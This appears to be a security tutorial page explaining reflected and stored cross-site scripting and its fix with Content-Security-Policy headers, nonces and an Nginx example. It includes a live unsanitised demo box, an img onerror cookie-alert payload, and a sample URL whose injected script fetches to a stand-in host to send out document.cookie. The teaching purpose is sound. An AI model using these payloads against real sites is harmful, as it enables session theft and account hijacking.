📖 What is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a page that other users visit. Because the script runs in the victim's browser under the site's origin, it can:

  • Steal document.cookie (session tokens)
  • Capture keystrokes and form data
  • Redirect the user to a phishing site
  • Silently perform actions on behalf of the user

Without Content-Security-Policy, the browser has no whitelist of trusted script sources — any injected script runs freely.

🔴 Live Demo — Reflected XSS

This search box naively renders whatever you type as HTML. Normally a server would do this; here the client reproduces the pattern so you can experiment safely in your own browser.

Try pasting the payload below into the box and clicking Search:

<img src=x onerror="alert('XSS: cookie=' + document.cookie)">

Because there is no CSP, the event handler fires and the alert pops. In a real attack the payload exfiltrates the cookie to an attacker-controlled server instead.

🔴 How the Attack Works — Step by Step

  1. 1Attacker finds a page that reflects user input into the DOM without sanitisation (search pages, error messages, URL parameters).
  2. 2Attacker crafts a URL containing a malicious payload, e.g.:
    https://vulnerable.example/?q=<script>fetch('https://evil.io/steal?c='+document.cookie)</script>
  3. 3Victim clicks the link (or attacker tricks them via email / social media).
  4. 4Server echoes the payload back in the HTML response; browser parses and executes it.
  5. 5Attacker's server receives the victim's session cookie and hijacks the account.

Stored XSS is worse: the payload is saved in the database (a comment, profile field) and fires for every visitor without any crafted URL.

✅ The Fix — Content-Security-Policy

Add this response header to tell the browser which sources it may load scripts from. Even if an attacker injects a <script> tag, the browser refuses to run it unless the source matches the policy.

Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';

What each directive does:

  • default-src 'self' — only load resources from the same origin by default.
  • script-src 'self' — scripts must come from the same origin; inline <script> blocks and onerror= attributes are blocked.
  • object-src 'none' — disallow Flash/plugin content entirely.
  • base-uri 'self' — prevent attackers from hijacking relative URLs with <base> injection.

In Nginx:

add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';" always;

For apps that need inline scripts, use a nonce instead of 'unsafe-inline':

<!-- Server generates a random nonce per request -->
Content-Security-Policy: script-src 'nonce-abc123XYZ'

<script nonce="abc123XYZ">
  // your legitimate inline script
</script>

Attacker-injected scripts have no nonce and are blocked even if they are inline.
